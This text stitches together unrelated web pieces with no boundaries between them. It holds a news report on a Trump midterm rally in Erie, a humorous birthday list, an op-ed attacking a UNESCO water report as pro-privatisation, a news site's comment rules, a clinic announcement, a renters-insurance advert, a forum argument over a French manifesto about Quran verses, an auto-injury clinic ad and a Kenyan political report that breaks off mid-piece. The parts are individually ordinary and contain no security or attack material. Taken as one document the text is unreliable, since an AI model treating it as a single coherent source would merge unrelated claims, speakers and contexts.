Then Trump turned back to politics. With weeks to go before the critical November elections, Trump and his fellow Republicans are engaged in an all-out midterms blitz. They have been invigorated by the successful nomination of Justice Brett Kavanaugh to the Supreme Court and are seeking to use the contentious moment to unify the GOP and stave off Democratic energy at the polls.
That Trump kept his appointment in Erie underscored the importance of this effort to Republicans. Earlier in the day, Trump received a hurricane briefing at the White House on the Category 4 storm. He told reporters he faced a "quagmire" about whether to attend the Pennsylvania rally because "thousands of people" were already lined up for the event.
He ultimately decided to attend, a move he criticized President Barack Obama for six years ago after Superstorm Sandy hit the East Coast.
"Yesterday Obama campaigned with JayZ & Springsteen while Hurricane Sandy victims across NY & NJ are still decimated by Sandy. Wrong!" Trump tweeted on Nov. 6, 2012.
On Wednesday, Trump touted two Republican congressmen, Mike Kelly and Lou Barletta. Kelly is facing a challenge from Democrat Ron DiNicola, while Barletta is mounting an uphill campaign to unseat two-term Democratic Sen. Bob Casey. The president, who attended a fundraiser before the rally, also praised GOP gubernatorial candidate Scott Wagner.
Trump also celebrated Kavanaugh's appointment amid Democratic opposition and sexual misconduct allegations against the nominee. Trump called it a "historic week," saying, "What the radical Democrats did to Brett Kavanaugh and his beautiful family is a national disgrace."
For weeks, Trump has been escalating his attacks on Democrats. He continued that effort Wednesday, claiming that Democrats want to "impose socialism and take over and destroy American health care." He added: "Democrats want to abolish America's borders and allow drugs and gangs to pour into our country."
Trump also returned to one of his favorite themes — reliving his stunning 2016 victory.
"Was that the most exciting evening?" he said to cheers.
Trump also ticked through what he sees as his top achievements, including tax cuts and a new trade deal with Canada and Mexico. He talked about exiting the Iran nuclear deal and drew wild applause for mentioning his plans for a Space Force.
Trump attacked Casey for opposing Kavanaugh's nomination, saying he had "joined the left-wing mob." He also accused Casey, named for his politician father, for "banking on the name of his father." Trump's own father, Fred, was a successful real estate developer who set his son up in business. The New York Times recently reported that Donald Trump received at least $413 million from his father over the decades, much of that through dubious tax dodges, including outright fraud.
Earlier Wednesday, Trump published an op-ed in USA Today that attacked Democrats over "Medicare for All" health care proposals. In his op-ed, Trump said Democrats have moved away from centrism, claiming the "new Democrats are radical socialists who want to model America's economy after Venezuela."
He added: "Government-run health care is just the beginning. Democrats are also pushing massive government control of education, private-sector businesses and other major sectors of the U.S. economy."
Trump's attack on Medicare for All omits any mention of improved benefits for seniors that Democrats promise.
Medicare for All means different things to different Democrats. The plan pushed by Sen. Bernie Sanders, the Vermont independent who challenged Hillary Clinton for the 2016 Democratic presidential nomination, would expand Medicare to cover almost everyone in the country, and current Medicare recipients would get improved benefits. Other Democratic plans would allow people to buy into a new government system modeled on Medicare, moving toward the goal of coverage for all while leaving private insurance in place.
Democrats, who think health care is a winning issue going into the midterms, also sought to focus voter attention Wednesday. In the Senate, Democrats unsuccessfully sought to scuttle Trump's push for short-term health insurance plans, which are less expensive but provide skimpier coverage. While the vote failed, Democrats think the move will help them in November.

Things I Learned While I was 48
Well it's that time of year of again. You know, the day in which I honor the awe and wonder that is the 28th day of September. Also known as the day of my birth. Yep.
And due to my wildly popular Best Things I Learned While I was 47 post last year, I thought I'd try to capitalize on a post format that worked so well last year, and bring that same glorious magic to my 48th year of living on planet earth as well. Predictability is highly underrated. Just sayin.
I know you're a-tingle with anticipation. So let's get right to it, shall we?
As always, in no particular order, here's what I learned over the past 365 days...
Alcoholic Root Beer tastes like Root Beer. With alcohol in it.
The only thing worse than my Obamacare health insurance payments is having the stomach flu and vomiting multiple times in one day. But it was almost too close to call.
It is possible to plan an entire wedding in two months without going completely insane.
Testosterone causes objects to become invisible to men when they're looking for them--even when they're right in front them.
Conversely, estrogen gives women the power to find things that are completely invisible to men.
Taking your daughter and granddaughter to see Cinderella is almost as magical as the movie itself.
No one is quite as hot as Richard Madden as the King of the North. Except maybe Richard Madden as Prince Charming.
Snagajob always seems to have amazeballs careers waiting for me. You know, like selling Avon, or working at Taco Bell.
It's OK if the Hubs wants to sleep with a college student. As long as it's me.
The easiest way to piss someone off is to reply 'K' to a paragraph-long text.
The best Dance Party is the Carlton Dance Party.
I have so much in common with Brad Pitt and Angelina Jolie. (We all eat at Subway sometimes, so yeah, it counts.)
KFC's recent 'Colonel' commercials are just creepy enough to make me NOT want to eat at KFC.
The only thing worse than KFC's 'Colonel' commercials are Matthew McConaughey's Lincoln commercials. Newsflash, Lincoln execs: if you wanna sell Lincolns, it's not that difficult.
I stop taking anyone seriously as soon as they use the word, 'Supposably.'
I'm pretty sure rocket science is far less complicated than getting the seal off of my bottle of International Delight creamer.
If the power's going to go out during a storm, it will be the same day you just went to the grocery store and your frig is crammed full of food.
I like Pina Coladas, and getting caught in the rain...
I'm glad I don't have to draw on my eyebrows every day, because at this point in my life I'm sure I'd forget to do that.
My need for bifocals became clear the moment I tried to pick up a wad of hair off the carpet. And it was a centipede.
Closing your eyes while you eat a candy bar makes it lose its calories. I read that on the Internet so I know it's true.
Finally, now that my birthday is nearing its end, I'm just sitting here waiting for my birthday dessert to arrive.
The cake would be awesome too.

UNESCO water report promotes privatisation narrative

The dangers of India's water policy
June 18, 2012 20:28 IST
A global water report promotes privatisation narrative which could be disastrous for India and the world, says Gopal Krishna.
Ahead of the United Nations Conference on Sustainable Development being held in June 20-22 in Rio de Janeiro, Brazil, the United Nations Educational, Scientific and Cultural Organisation published a 909-page report titled 'United Nations World Water Development Report 4: Managing Water under Uncertainty and Risk. It is envisaged as a conference at the highest possible level, including heads of state and government or other representatives. It will result in a focused global political document
Citing a World Bank document of 2009, this three volume report says: "The National Ganga River Basin Authority in India, with the financial support of the World Bank, launched a programme in 2009 to clean the Ganges, to ensure that 'no untreated municipal sewage or industrial effluents would be discharged into the river by 2020'. Previous action plans did not improve the health of the river, in which almost 95 percent of the pollution is caused by sewers and open drains (World Bank, 2011b). This time the governmental approach has moved from a town centric approach to a broader river basin approach..."
The report's treatment of Ganga Basin, the largest river basin of the country which has catchment in 11 States leaves a lot to be desired. The report fails to enlist any achievement of the authority that was set up in February 2009. It does not scrutinise whether or not the promised 'broader river basin approach' has indeed been adopted. It does not dwell on the split personality of the bank either.
The bank has been undertaking contradictory projects in the Ganga basin without any sense of accountability. It depletes water quality of Ganga by supporting dams upstream and it provides loans for improvement of water quality in its downstream. The second volume of Environmental and Social Management Framework for Bank assisted National Ganga River Basin Project document says, "The Ganga basin (which also extends into parts of Nepal, China and Bangladesh) accounts for about 26 percent of India's landmass, 30 percent of its water resources, and more than 40 percent of its population."
If the bank knew that Ganga basin is an international river basin, how did it choose to refer to it as 'national'? The UNESCO's report like the bank fails to comprehend that both Ganga and Mekong are trans-boundary rivers of the Himalayan watershed.
The UNESCO report states that approximately 1.2 billion people, over half of whom live in India, defecate in the open. This has been snobbishly articulated a billion times. The report's colossal failure lies in not documenting and comparing the water footprint of those who defecate in open and those who defecate within their own houses. It shows that the authors are offering platitudes and prejudiced observations and hiding the sins of those who defecate in closed spaces. This dereliction happened perhaps due to class affinity.
The release of the UNESCO report a few months prior to the Rio+20 Earth Summit could indeed have provided a sound basis for discussions on the future of our planet and water's centrality in it, had it not caved in under the influence of international, financial institutions, entities like the World Business Council for Sustainable Development and the World Resources Institute, their The Access Initiative and Coca Cola. It has provided quite an unsound basis to comprehend and initiate steps to protect the ecological space of water. Most importantly, it has failed in ambition.
If one compares the 522 page report of the Western Ghats ecology expert panel of the Union environment & forests ministry for south and western India, one will find the poverty of ecological imagination of authors of the UNESCO's report. The Indian panel advocates a graded or layered approach, with regulatory as well as promotional measures appropriately fine-tuned to local ecological and social contexts within the broad framework by fine-tuning through a participatory process going down to gram sabhas. Now that Ganga River Basin Authority and Mekong River Commission has proven itself to be too weak to act to safeguard the ecological integrity of river basins, the report of the Western Ghats panel creates a compelling logic for a high-powered panel both at national and international level to adopt a similar approach in dealing with ecological and natural resources in order to set matters right in the global eco system outside the 'piped and bottled water framework'.
UNESCO's report refers to India's National Water Mission as a part of the National Action Plan on Climate Change (2008) which is identifying several strategies to tackle climate change and achieve water-related goals. "The main goals are to create a comprehensive water database and proper public awareness and education campaigns, shift focus on overexploited areas, increase water use efficiency by 20 percent and promote IWRM (Integrated Water Resource Management) on a basin level…," observes the report. Such uncritical reproduction of official documents like the mission document ignores the parochial approach of the authors of the report. They have failed to comprehend the stark democracy deficit in the process of creating it.
Citing a Planning Commission document of 2002, it says, "Water supply is a state responsibility, but various ministries share responsibility at central and state levels… Local governments are increasingly turning operating and maintenance responsibilities to private companies." The report is attempting to build a case for privatisation of water by selectively citing bank-influenced documents of the Planning Commission. It fails to record the failure of private water companies who are engaged in direct water trade through pipes and bottles, in tankers and vessels, and indirectly or 'virtually' through products.
Not surprisingly, the authors of UNESCO report are quite impressed with a study titled The Coca-Cola Company and The Nature Conservancy that was done by researchers at the Twente University in the Netherlands in collaboration with Coca-Cola Enterprises Inc and Coca-Cola Europe on the water footprint of a PET bottle of Coca-Cola. It found that the operational water footprint, equates to only about 1 percent of the total water footprint. The supply chain overhead water footprint was calculated and found to be negligible. There could not have been any negative inference of this research. Will companies collaborate in studies which bring negative results and publicity for them? But authors of UNESCO report chose to overlook this manifest conflict of interest ridden study.
If UNESCO's report is looked at in the context of India's Draft National Water Policy of 2012 and the Planning Commission's Draft National Water Framework Act, it becomes clear that both fail to undo the onslaught on the public water across the country by the foreign, national water companies and advocate corporatization and private sector participation.
The UNESCO'report is indulgent towards maintaining status quo. It meekly states, "In regions where there are large discrepancies between where the water is and where it is needed, the construction of large inter-basin transfer projects is likely to continue – despite the recognized advantages of moving the products of water rather than the water itself." It does not question the desirability of "water re-allocation" through "agriculture-to-urban water transfers." The draft policy quite like the 2002 version recommends diversion of rivers for interlinking by referring to inter-basin transfer of water although Government of India's National Commission for Integrated Water Resources Development Plan had recommended against it in 1999.
The UNESCO report provides case studies to argue for water banking for surface water and groundwater and water markets and continuous public sector involvement so that "The public intermediary buys water from the willing sellers and then sells it to buyers. With this system, water managers are confident they can find the water they need at a predictable price."
The reflection of this state of mind is visible even in Draft National Water Policy of 2012. The draft policy recommends "The "Service Provider" role of the state should be gradually shifted to that of a regulator of services and facilitator for strengthening the institutions responsible for planning, implementation and management of water resources. The water related services should be transferred to community and / or private sector with appropriate "Public Private Partnership" model."
The meeting dissected the reply of the Union Water Resources Minister, Pawan Kumar Bansal given to the Parliament on May 7, 2012. Bansal said, "In the new proposed water policy, we have taken care to emphasize that the State should be encouraged to go in for public private partnership… public private partnership does not mean that you are privatizing the water sector. We are not privatising the water sector." He added that there are many good projects where "the public private partnership model has been found attractive enough by different cities in the country to adopt that."
Bansal mentioned the names of cities like Tirpur, Salt Lake Kolkata, Chennai, Nagpur, Hyderabad, Hubli, Dharwar, Belgaum, Gulbarga, Lattur, Mysore, Haldia, Dewas, Khandwa, Shivpuri, Raipur, Kolhapur, etc. He argued that at "So many places for one purpose or the other public private partnership model has been utilised, and it would be the policy of the Government to encourage that." On May 10-11, at the national meeting of citizens' groups Bansal's reply in the Parliament was analyzed and there was unanimity among the participants that he was misrepresenting facts and misleading the house with impunity. The cities which mentioned by the minister are cases of failed PPP projects. Votaries of privatisation argue that they are not privatizing water, but only involving private parties in managing it. The fact is no private operator undertakes a project unless it is assured of its raw material i.e. water.
The fact is that the basic premise of PPP stands exposed despite this the JNUNURM model for signing PPP is being adopted in several cities. It has been extended from 63 cities to 5, 000 cities. The water related services are being transferred to a PPP mode, any venture in which the private sector is involved in a manner that it exercises control on some or all parts of the water supply system, from production, transmission, treatment to delivery. There are several PPP projects where more than 90 per cent of the capital expenditure of $28.8 million comes from public resources. City's water supplies are being handed over to private companies for 25 years. These agreement include a restriction that no parallel competing facility will be allowed.
Arati Tiwari, corporator, Gulbarga shared the elaborate case study at the national meeting about how Karnataka Government's plan to extend the 24x7 water supply scheme from a few select wards to entire city corporations of Hubli-Dharwad, Belgaum and Gulbarga has caused massive monetary increase in the rate of water supply. None of the 55 corporators of Gulbarga City Council have given their consent still the plan is unfolding. She narrated how her family has to foot a bill of Rs 3500/month as water charge. She argued that democracy has become a government off the people, to buy the people and forget the people. The fact is that PPP arrangement is privatisation. In some states it was noted how the promise of 24 X 7 water supply turned out to be a 6-hour water supply even this is not mandatory.
A dissenting report annexed to the report of the Planning Commission's Working Group on Urban and Industrial Water Supply and Sanitation expressed disappointment with the fact that Water as Fundamental Human Right has not been articulated strongly enough. Quite like the UNESCO report, Working Group's report too has missed out on highlighting many serious problems of privatisation and PPPs and their serious implications. In such a situation, the recommendations in these reports appear quite weak.
A situation is emerging where instead of providing assured safe drinking water as matter of right, right to purchase bottled water is being pushed. Despite this both national efforts and UN reports do not suggest anything to reverse the trend to save the ecosystem and its fluid for the present and future generations. Wedded to market socialism, China may have forgotten the lessons of free trade in opium, India and Indians cannot afford to allow free trade in water although their government is unconstitutionally declaring the country to be a market democracy.

TucsonSentinel.com is an Arizona nonprofit organization fiscally sponsored by FCIR.org, a 501c3 charity. Your contribution is tax-deductible.
User Guidelines
Please be respectful and relevant. Thought-provoking. Or at least funny.
We want comments to advance the discussion and we need your help. Debate, disagree, yell (digitally) or laugh, but do it with respect.
We won't censor your comments if we don't agree with you; we want viewpoints from across the political spectrum. We're dedicated to sparking an open, active discussion. We believe people with differing opinions can spark debate and effect change.
Comments are open to registered users of TucsonSentinel.com.
Keep in mind:
A conversation involves sharing and respect. Support your viewpoint with facts, not attacks.
Ask questions. Search out answers.
Remember that being part of a community requires tolerance for differing views.
We can't ensure that all comments are based in truth. The only comments we endorse are those we write ourselves.
TucsonSentinel.com does not allow:
Hate speech. Blatantly racist, sexist or homophobic slurs or calls for violence against a particular type of person, etc. will be removed.
Obscenity & excessive cursing. Sometimes a well-placed curse word - if you're creative enough to get it past our auto-censor - can express your point in just the right way. But we say '%*$& no' to cursing for cursing's sake. And lose the explicit sexually-descriptive language. It doesn't contribute to the debate and there are plenty of other places on the Internet to find it.
Flaming. During a heated discussion, unkind words may be spoken. We can live with a certain amount of rudeness in the name of provocative conversation, but a pattern of personal attacks (name-calling, mocking, or baiting) is not acceptable nor are threatening or harassing comments. Show some respect, please.
Explicit political endorsements. As a nonprofit we can't allow electioneering. Analysis and explanation of political issues and candidates are encouraged, but specific calls to vote for or against a measure or politician should be done elsewhere.
Spam. Solicitation of products or services isn't allowed; contact us about advertising, we'd love to talk to you. Links to off-topic sites may be deleted.
Copyright or IP infringement. Lengthy quotes and violations of 'Fair Use' aren't allowed. Anything you post should be your own work.
Overposting. Don't bore people and waste electrons with identical comments on multiple stories or repetitive comments that don't advance a conversation.
Trolling, sockpuppetry, and other abusive behavior. Please don't feed the trolls and don't pretend to be someone you're not.
Gossip. Don't bring up others who can't defend themselves. We don't give out personal information; you shouldn't either.
Comments that violate these guidelines may be removed. We reserve the right to make up the rules as we go along.
Flagging
Commentors are solely responsible for the opinions they express and the accuracy of the information they provide. Users who violate these standards may lose their privileges on TucsonSentinel.com.
Sentinel editors can't read every comment. Trolls, spammers and other troublemakers can slide under the bridge. We rely on you to help maintain a healthy conversation - more than likely, you're reading these comments before the editors.
What if you see something inappropriate? Use the 'Flag' button to send it to a moderation queue. Help us out and tell us why you're reporting it; please don't report someone just because you disagree with them. Boy who cried wolf and all that. We'll take appropriate action on violations.
We will not edit comments to alter their meaning or censor comments because of political content.
We will not remove comments solely because they are heartless, cruel, coarse, foolish or just plain wrong. Your disapproval can maintain a decent signal to noise ratio. Ultimately, however, self-policing is the best method.
Bottom line, don't be a jerk.

Whitney Young Health Names Building, Expands Integrated Care Delivery
Home > About Us > Blog & Newsletter > 2016 > October > 20 > Whitney Young Health Names Building, Expands Integrated Care Delivery
October 20, 2016 Kate Renna News
| Share This Post:
Whitney Young Health has announced the naming of its property at 10 Dewitt Street in Albany. The Harry and Jeanette Weinberg Treatment Center was recently remodeled with funding from the Harry and Jeanette Weinberg Foundation, federal funding through the Affordable Care Act, state funding through the Department of Health and other local supporters.

The site, which has long housed Whitney Young Health’s methadone maintenance treatment program, now also includes an intensive outpatient program for people with substance use disorder; a primary care office; and UP-BEAT, a program to engage high-risk populations in medical and behavioral health care.

According to Whitney Young Health President and CEO David Shippee, “This facility is just one way in which Whitney Young Health is integrating behavioral health and primary care. Through our work here and in our health centers, we are identifying and addressing the full range of a patient’s needs – whether they come to us initially for medical care or for assistance with mental health or substance use problems.”
Steven Giordano, PhD, Mental Health Commissioner for Albany County, expounded on the importance of integrated care and its role in the future delivery of health care. “For too long, we’ve been sending people all over town to address their multiple needs.”

Top Renters Insurance Myths
Renters insurance is a smart, affordable way to protect your belongings, but only 37% of tenants have it.
Most people wouldn’t think of owning a home without homeowners insurance or driving a car without auto insurance. So why is it that so many renters go without renters insurance? According to the Insurance Information Institute, 95% of homeowners are covered while only 37% of renters have renters insurance. The reason may be due to some commonly held misconceptions. Here are 6 myths about renters insurance.
Contact us today for a free quote »
1. Renters insurance is too expensive.
On top of rent, utilities, groceries, and living expenses, the thought of another bill terrifies most people. Truth is, the average price of renters insurance is only about $15 per month. For the price of takeout dinner, you could protect your belongings from theft, fire, damage, and more.
2. My stuff isn’t worth insuring.
It’s common for renters to undervalue their belongings. Just because your apartment isn’t decked out with priceless art and Oriental rugs doesn’t mean your things aren’t worth a lot. The average renter owns between $20,000-30,000 worth of possessions. Look at your TV, computer, bike, furniture, clothes, shoes—if all that was gone one day, how much would it cost to replace it?
Bonus Tip: If you have your own auto policy, adding renters insurance will give you a multi-policy discount.
3. My landlord has insurance, so I’m covered…right?
Your landlord’s insurance typically covers the structure of the building you live in, not the contents or tenant’s belongings in it. If your possessions are stolen or damaged, it’s up to you to replace them.
4. My roommate has insurance, so I’m covered…right?
Your roommate might be able to add you to his or her policy, but sharing renters insurance can cause a lot of trouble. Your premium is based on an inventory of insurable items. If your laptop, TV, and clothes are a lot more expensive than your roommates, how do you figure out how to split the premium?
Also, coverage limits don’t increase automatically when you add someone to a policy. If your roommate has $10,000 worth of coverage before adding you to her policy, she’ll still only have $10,000 of coverage afterward. This probably isn’t enough to protect both of your belongings. Even sharing a policy with a live-in significant other can be problematic unless you truly co-own all your possessions.
5. My parents have insurance, so I’m covered…right?
If you’re a college student living in campus-owned housing, your parent’s homeowners insurance typically covers your belongings. Off-premises coverage may be a percentage of what it is at home, but it’s usually enough to protect the contents of a dorm room.
Off-premise coverage may not apply if you live off campus. Your parents will need to check their policy to make sure, but even if you are covered, a separate renters insurance policy offers a lot more protection.
6. Renters insurance only covers my personal belongings.
True, renters insurance does protect your personal property, but it does a lot more too. Your coverage doesn’t stop at the front door—it follows you anywhere you go. If your luggage is stolen while on vacation, it’s covered. If your laptop is taken out of your car, whether it’s down the block or out-of-state, it’s covered.
Renters insurance also gives you liability coverage. This protects you if you are sued for claims that come within the coverage of your policy. For example, if the mailman trips on a frayed rug and sues you for damages, liability coverage would protect you from paying out of pocket. Or if your washing machine breaks and floods the downstairs apartment, you liability insurance would cover the cost of damaged property.
Ask your Yetter Insurance Agent how much liability coverage they recommend. Medical and repair bills can add up quickly, and you’ll be responsible for any amount over your policy limit.
How do I choose a renters insurance policy?
Your coverage needs depend on several factors like age, location, and risk of natural disasters in your area. You may also have to decide if you want a cash value policy or an actual replacement value policy. A cash value policy reimburses you for what your items are worth today—so if you bought a $1,000 flat screen TV 5 years ago, it might only be worth $200 today. A replacement value policy reimburses you for the amount it would cost to purchase an equivalent item today.
Choosing the best policy depends on your belongings and individual situation, but a Yetter Insurance Agent can help make sure you’re getting the best policy at the best rate.

From the preceding post:
It would be fairer to say RT tried to influence its viewers by airing coverage consistently critical of the American democratic system and process in general—and unfortunately for US intelligence agencies—there is no crime in that.

I’m astonished at this news.
Looks like France is throwing elbows at the US, aspiring to worst policy toward ‘minorities.’
Get a load of this: France wants to change wording in religious books.
_________________
Excerpt:
YOU THINK LIFE is bad for Muslims in Trump’s America? Spare a thought for the Muslims of France.
Over the past few years, they have been collectively blamed, and punished, for a series of horrific terror attacks carried out in France by so-called jihadists. The latest, a knife attack in Paris by a man shouting “Allahu akbar,” killed one person and injured four others last weekend.
While anti-Muslim bigotry has become a hallmark of the Republican right in America, in France it is a truly bipartisan affair. Islamophobia is peddled by the left and right alike, with both socialists and conservatives falling over one another to defend French secularism, or laïcité, by demonizing French Muslims.

Original reporting. Fearless journalism. Delivered to you.
I’m in
Consider: Successive French governments have criminalized the face veil and banned the headscarf in schools. French mayors have targeted Muslim women who want to cover up at the beach and Muslim school kids who try to have a pork-free lunch. The French president — and new liberal heartthrob — Emmanuel Macron has introduced draconian counterterror legislation that United Nations human rights experts have warned could have a discriminatory impact on Muslims in particular.
And the latest big idea? To go after the Quran. On April 21, the newspaper Le Parisien published a manifesto “against the new anti-Semitism,” signed by 300 public figures — ranging from former President Nicolas Sarkozy and former Prime Minister Manuel Valls, to actor Gérard Depardieu and singer Charles Aznavour. According to The Atlantic, the manifesto states that “11 Jews have been assassinated — and some tortured — by radical Islamists” in France, and demands that “the verses of the Quran calling for murder and punishment of Jews, Christians, and nonbelievers be struck to obsolescence by religious authorities,” so that “no believer can refer to a sacred text to commit a crime.”
Such rhetoric is a reflection both of Gallic bigotry and sheer stupidity, a toxic combination of ignorance and privilege.
First, where are these Muslim “religious authorities” who would be willing to do to the Quran what Thomas Jefferson did to the Bible? Establishment-friendly French imams, such as Dalil Boubakeur, rector of the Grand Mosque of Paris, and Tareq Oubrou, imam of Bordeaux’s Grand Mosque, have denounced the manifesto as “unbelievable and unfair” and “nearly blasphemous.” And were such mainstream figures to even agree to edit the Quran — believed by Muslims to be the literal word of God! — does anyone really believe that the fanatics of the Islamic State or Al Qaeda would give a damn?
Second, violent extremism isn’t a product of scripture. Contrary to conventional wisdom, and as I have argued in the past while citing a raft of studies and experts, religious faith “isn’t a crucial factor” in terror attacks — or in the process of so-called radicalization. Why, then, obsess over Quranic verses? As the French journalist Didier Francois, who was held hostage by ISIS in Syria, told CNN in 2015: “There was never really discussion about texts or — it was not a religious discussion. It was a political discussion. … Because it has nothing to do with the Quran.” Or, as his fellow former French hostage, Nicolas Henin, has said, “I noticed that these jihadists have little to do with … Arab or Muslim culture — they are children of our societies. … They are products of our culture, our world.”
Who do you take more seriously? Two former ISIS hostages? Or the guy from “Green Card“?
Third, how can the manifesto signatories be so sure that it is French Muslims who are behind the rise of this “new anti-Semitism”? As a 2016 study of anti-Semitic hate crimes in France by Human Rights First noted, “Perpetrators of most antisemitic violence are perceived to be of ‘Muslim culture or origin’ … although there is no data to substantiate this conclusion—in part because of the prohibition in France on collecting ‘ethnic’ statistics.” Yet in next-door Germany, where such statistics are collected by the police, nine out of 10 anti-Semitic hate crimes in 2017 were carried out not by radicalized Muslims, but by “members of far-right or neo-Nazi groups.”
FOURTH, WHAT EVIDENCE is there that the Quran itself is anti-Semitic? Or that Islam has a particular problem with Jews? Critics often point to verses of the Muslim holy book that express hostility towards Jews, while ignoring the specific historical and theological context for such verses, and also ignoring those many other Quranic verses which heap praise on Jewish people.
As the Princeton University historian Mark Cohen, an expert on Jewish-Muslim relations, points out: “Islam contains a nucleus of pluralism that gave the Jews in Muslim lands greater security than Jews had in Christian Europe,” and therefore, “Jews in the Islamic orbit were spared the damaging stigma of ‘otherness’ and anti-Semitism suffered by Jews in Europe.” Modern-day Muslim and Arab anti-Semitism is a consequence of colonialism, conflicting nationalisms, and the clash with Zionism, argues Cohen, and is neither “indigenous” to the Middle East, nor “inherent” in Islam.
Fifth, why single out Islamic scripture in this way? Why not Jewish or Christian scripture, too? Are we supposed to pretend that the Old Testament of the Bible doesn’t contain scores of verses that incite violence and hatred against nonbelievers? Or, that those verses haven’t been used to justify heinous crimes in recent years? Against Palestinians, Iraqis, Ugandans, Norwegian kids, and American abortion clinics, among others?
To avoid the charge of hypocrisy, therefore, will the signatories to this manifesto, who include France’s chief rabbi Haim Korsia, also call for verses of the Bible to be “struck to obsolescence by religious authorities”?
Sixth, whatever happened to the “liberté” part of “liberté, égalité, fraternité“? How is the insistence on removing verses from the Quran compatible with religious freedom (a crucial, if less discussed, part of the French secular tradition)? How is it compatible with freedom of speech or expression? Whatever happened to the land of “Je Suis Charlie“? Well, guess what? The manifesto was drafted by, of all people, Philippe Val, the former managing editor of Charlie Hebdo. Irony, it seems, may have died a quiet death in France.

@Lash,
European Jews have deleted anti-christian buts in the talmud during the middle ages, and the Catholic Church has recently come to terms with the antisemitism inherent to certain Gospels, so it can be done...
Whether rabbis should throw stones when living in a glasshouse*, i don't know.
* There are many racist passages in the torah and talmud. And these are in current use in Israel -- see the "King's Torah" controversy.

@Olivier5,
There's all the difference in the world between adherents of a religion deciding to alter their so-called holy books, and the state outlawing passages.
This is the French president claiming his intention to edit the Koran.
Full disclosure: I despise those hateful passages and decried them many times in these pages, but I don't support them being edited, just openly discussed and called out for what they are: incitement to violence.

@Lash,
I haven't heard anything about this, but if you are right, I definitely agree. That kind of a thing should be a taboo to even consider. But the French have a few controversial things like this in recent years. Didn't at one time Muslim women were not allowed to wear the Burkini?

I doubt very much you understand the context. Many hateful passages/fatwas were in response to circumstances and have been deliberately misinterpreted by fundamentalist imams to justify criminal acts.
There's one fatwa which is often touted excusing the killing of civilians. This has been used by extremists on both sides to justify terrorism or vilify Islam. On first reading it would seem that was the case, but the truth is far less clear cut. This fatwa dates from the Mongol invasion where Muslim civilians were strapped to siege towers by the Mongols, in effect making them human shields. Said hateful fatwa stated that in those circumstances it was alright to fire on the siege towers because the alternative would be annihilation.
Context is everything.

The current state of Twitter: they are practicing open censorship against progressives. We are being banned for arguing with establishment Democrats. We've been screensaving the tweets that get us banned, just to ensure we're not afield of TOS.
Most of the best voices in progressive politics are being banned or shadow banned -- meaning that their tweets are not being disseminated as usual to people who follow them. We are currently checking in with each other on our timelines to see how many tweets we've missed.
This type of censorship may seem silly to most of you now. Especially short-sighted people who can't imagine this happening to them or people with their political views, but rational people will understand that if this is ok in this country against one group, no one is safe.
When my account was frozen, Twitter lied about it. My account was "behaving suspiciously", they said. "Prove you're a person", they said. I followed the procedure they requested. They, like everyone else in this country, tried to allege I was Russian to censor me.
After I proved who I was, they said "sometimes it takes a few weeks to restore accounts. Sometimes, it takes longer..."
This is happening to a lot of people calling bullshit on the two party system and the establishment narrative.
Just a warning to those who are watching the world climate. This is a draconian free speech clampdown in plain view.
Julian Assange has been cut off from the world for about a month now. Just FYI.

If I'm not mistaken, there are French laws against forms of face coverings seemingly designed for Muslims.

@izzythepush,
You seem to be focused on how non-Muslims can 'misinterpret' the intent of these passages; I've seen many documentaries and videos throughout the years of Imams delivering these lines to incite violence.
They are used by both camps toward violent purposes.

Errr... no! Macron has nothing to see with it. This is just a bunch of private folks publishing an open letter in newspaper Le Parisien, like Terry Jones burning a Qoran, although less extreme.

I know just a bit of French, but from what source did you get that?
I think that they've got the loi de séparation des Églises et de l'État, so Macron, as président de la République française would act against the law and constitution.

I lifted this quote from the article above:
“Emmanuel Macron has introduced draconian counterterror legislation that United Nations human rights experts have warned could have a discriminatory impact on Muslims in particular.
And the latest big idea? To go after the Quran. On April 21, the newspaper Le Parisien published a manifesto...”

As usual, there's a certain level of stupidity and misinformation in those critiques coming from far far away, as if it was de rigueur for US and British journalists to turn off their brains and lower their professional standards as soon as they start speaking of France.

The rest of your article clearly states that this manifesto is published by people having nothing to see with Macron.
Is it mandatory for you Americans to behave as total fools when speaking of France?

It's an open letter, and just because "un ancien président de la République, trois anciens Premiers ministres, des élus, des intellectuels, des artistes…" are among the 250 persons who signed that letter, Macron isn't among them.

@Walter Hinteler,
I noticed he wasn't a signatory, and older statements seemed to put him apart from this aggression against Muslims, but recent articles allude to a weakening of his resolve not to join the voices for a clampdown on Muslims' autonomy.
Don't misinterpret my comments as an attack on Macron. I'm just watching and commenting on events. I'm not invested in any anti-Macron sentiment.

Which is why I said, if true. I do know that Burkini thing happened, but it is now struck down. I am not dissing the French, I mean look at us. We are practically tearing our country apart.

Auto injury doctor Treats Whiplash, Back Pain and Neck Pain
A Accident doctor has substantial experience diagnosing and treating injuries like whiplash. A number of these injuries have no immediate symptoms after a car wreck, even though serious trauma may have occurred to your body. It’s quite normal just to walk away from a car accident thinking that you’ve only suffered a few bruises.
One of the most common car accident injuries is whiplash. This injury occurs when the force of a rear impact whips the cervical spine abruptly beyond its normal range of motion. This backwards and forwards movement can shift the spine out of alignment, while also straining muscles in the shoulders and neck.
Milpitas Accident doctors can treat herniated or bulging disc, sciatica, headaches, migraines, and other soft tissue injuries following an auto accident. Just like having a whiplash injury, a misalignment of the spine can lead to back pain, neck pain, headaches and migraines.

Kenya: 'TeamKenya' Jubilee MPs Now Want DP Ruto Removed From Office
By Rushdie Oudia and Victor Raballa
President Uhuru Kenyatta and ODM leader Raila Odinga on Thursday told Kisumu residents that they were forced to work together as their brand of politics had been "beaten by the rain".
In a concerted effort to market their 'handshake, the popular term for the unity deal they announced on March 9, the two said the customary winner-takes-all political system is injurious as it causes tension.
BLOODSHED
At Mamboleo showground during the historic tour, President Kenyatta said, "This thing of winner-takes-all ...we will have to look into it because we want to unite our people."
The president and Mr Odinga defended their deal and urged the people to support them as development will be enhanced.
The agreement will last, they said in their addresses, noting its positive effects on the fight against corruption and other ills.
The president said that in his discussions with Mr Odinga, the African Union High Representative for Infrastructure Development, they resolved that blood will not be shed every five years due to the general elections.
"We do not want the winner-takes-all' mentality after the elections. That is why we are embracing other leaders," he said.
"We will continue with the war against draft. If you go to Kondele and find a thief, do you ask for his tribe or you take action against him? That is what we are doing to the corrupt individuals stealing public funds."
President Kenyatta, who launched the pilot phase of the universal health coverage programme, further said that his reconciliation with an erstwhile political rival was good for the country.
"We agreed to work together and we will not go back. Did you see yesterday, for the first time, leaders from Nasa and Jubilee standing on the same podium to celebrate Jamhuri Day?"
"Leaders have agreed to work together for development so can you, the people of Kisumu, show me if you support that?"
LESSONS LEARNED
